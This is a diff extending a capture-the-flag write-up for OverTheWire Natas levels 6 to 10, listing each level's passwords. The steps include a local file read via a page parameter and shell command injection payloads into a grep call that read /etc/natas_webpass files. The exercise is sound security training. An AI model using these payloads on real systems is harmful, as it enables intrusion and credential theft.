@@ -5,7 +5,7 @@
 *	user: `natas0`
 *	pass: `natas0`
 *	url: `http://natas0.natas.labs.overthewire.org`
-*	flag: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`	
+*	flag: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`
 
 ### Procedure
 
@@ -20,7 +20,7 @@
 *	user: `natas1`
 *	pass: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`
 *	url: `http://natas1.natas.labs.overthewire.org`
-*	flag: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`	
+*	flag: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`
 
 ### Procedure
 
@@ -182,5 +182,220 @@
 *	user: `natas6`
 *	pass: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`
 *	url: `http://natas6.natas.labs.overthewire.org`
-*	flag: `???`
+*	flag: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
 
+### Procedure
+
+1.	By clicking on `View sourcecode` a PHP script is shown
+
+		<?
+
+		include "includes/secret.inc";
+
+		if(array_key_exists("submit", $_POST)) {
+				if($secret == $_POST['secret']) {
+				print "Access granted. The password for natas7 is <censored>";
+			} else {
+				print "Wrong secret";
+			}
+		}
+		?>
+
+2.	The script says that `secret` parameter in the `POST` is checked
+	against variable `$secret`. Furthermore, file `includes/secret.inc`
+	is imported. Let's see what it contains
+
+		$ curl -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
+		<?
+		$secret = "FOEIUWGHFEEUHOFUOIU";
+		?>
+
+3.	Go back to the home page and try to provide the secret
+	`FOEIUWGHFEEUHOFUOIU`. Bingo!
+
+		Access granted. The password for natas7 is
+		7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+## Natas7
+
+*	user: `natas7`
+*	pass: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`
+*	url: `http://natas7.natas.labs.overthewire.org`
+*	flag: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`
+
+### Procedure
+
+1.	Page provides `Home` and `About` that link to
+
+		http://natas7.natas.labs.overthewire.org/index.php?page=home
+
+	and
+
+		http://natas7.natas.labs.overthewire.org/index.php?page=about
+
+	By taking a look in the source code there is the hint
+
+		<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+2.	Let's try to pass `/etc/natas_webpass/natas8` path as `page` value
+
+		$ curl -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+		<html>
+		<head>[...]</head>
+		<body>
+		<h1>natas7</h1>
+		<div id="content">
+
+		<a href="index.php?page=home">Home</a>
+		<a href="index.php?page=about">About</a>
+		<br>
+		<br>
+		DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+		<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+		</div>
+		</body>
+		</html>
+
+## Natas8
+
+*	user: `natas8`
+*	pass: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`
+*	url: `http://natas8.natas.labs.overthewire.org`
+*	flag: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
+
+### Procedure
+
+1.	This seems to be similar to Natas6. Let's click on `View sourcecode`
+
+		<?
+
+		$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+		function encodeSecret($secret) {
+			return bin2hex(strrev(base64_encode($secret)));
+		}
+
+		if(array_key_exists("submit", $_POST)) {
+			if(encodeSecret($_POST['secret']) == $encodedSecret) {
+			print "Access granted. The password for natas9 is <censored>";
+			} else {
+			print "Wrong secret";
+			}
+		}
+		?>
+
+2.	Secret `3d3d516343746d4d6d6c315669563362` seems to be a HEX string.
+	Decode it
+
+		$ echo -n 3d3d516343746d4d6d6c315669563362 | perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
+		==QcCtmMml1ViV3b
+
+	It's a reversed Base64 string. Let's try to decode it
+
+		$ echo "==QcCtmMml1ViV3b" | rev | base64 -d
+		oubWYf2kBq
+
+3.	Let's try to use `oubWYf2kBq` secret
+
+		Access granted. The password for natas9 is
+		W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+## Natas9
+
+*	user: `natas9`
+*	pass: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
+*	url: `http://natas9.natas.labs.overthewire.org`
+*	flag: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
+
+### Procedure
+
+1.	Let's click on `View sourcecode`
+
+		<pre>
+		<?
+		$key = "";
+
+		if(array_key_exists("needle", $_REQUEST)) {
+			$key = $_REQUEST["needle"];
+		}
+
+		if($key != "") {
+			passthru("grep -i $key dictionary.txt");
+		}
+		?>
+		</pre>
+
+2.	The way to call `grep` command seems to be vulnerable to commands
+	injection. Let's try to set value of `needle` parameter to
+	`; ls -l ;`
+
+		total 480
+		drwxr-x---  2 natas9 natas9   4096 Nov 14 10:32 .
+		drwxr-xr-x 34 root   root     4096 Nov 15 17:17 ..
+		-rw-r-----  1 natas9 natas9    118 Nov 14 10:32 .htaccess
+		-rw-r-----  1 natas9 natas9     42 Nov 14 10:32 .htpasswd
+		-rw-r-----  1 natas9 natas9 460878 Nov 14 10:27 dictionary.txt
+		-rw-r-----  1 natas9 natas9   1952 Nov 14 10:32 index-source.html
+		-rw-r-----  1 natas9 natas9   1185 Nov 14 10:32 index.php
+		-rw-r-----  1 natas9 natas9   1165 Nov 14 10:27 index.php.tmpl
+
+3.	Let's try the same path suggested in Natas7. By injecting the
+	following code
+
+		; cat /etc/natas_webpass/natas10 ;
+
+	the result is
+
+		nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+## Natas10
+
+*	user: `natas10`
+*	pass: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
+*	url: `http://natas10.natas.labs.overthewire.org`
+*	flag: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`
+
+### Procedure
+
+1.	It seems to be similar to Natas9 but here chars `;`, `&` and `|`
+	are not allowed. Let's try with other *magic* symbols...
+
+2.	By inserting `*` seems that something is mooving in the right way.
+	Indeed, `grep` supports wildcards, so let's try with `.*`...
+
+3.	Well! Files in current dir are listed, but `dictionary.txt` is huge
+
+		.htaccess:AuthType Basic
+		.htaccess: AuthName "Authentication required"
+		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+		.htaccess: require valid-user
+		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
+		dictionary.txt:African
+		dictionary.txt:Africans
+		dictionary.txt:Allah
+		dictionary.txt:Allah's
+		dictionary.txt:American
+		...
+
+4.	Let's try to exclude it by using `.* #`...
+
+		.htaccess:AuthType Basic
+		.htaccess: AuthName "Authentication required"
+		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+		.htaccess: require valid-user
+		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
+
+5.	Yep! I feel the smell of the flag! As is Natas7 and Natan9, now
+	password should be in
+
+		/etc/natas_webpass/natas11
+
+	Let's try by injecting `.* /etc/natas_webpass/natas11 #`
+
+		.htaccess:AuthType Basic
+		.htaccess: AuthName "Authentication required"
+		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+		.htaccess: require valid-user
+		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
+		/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
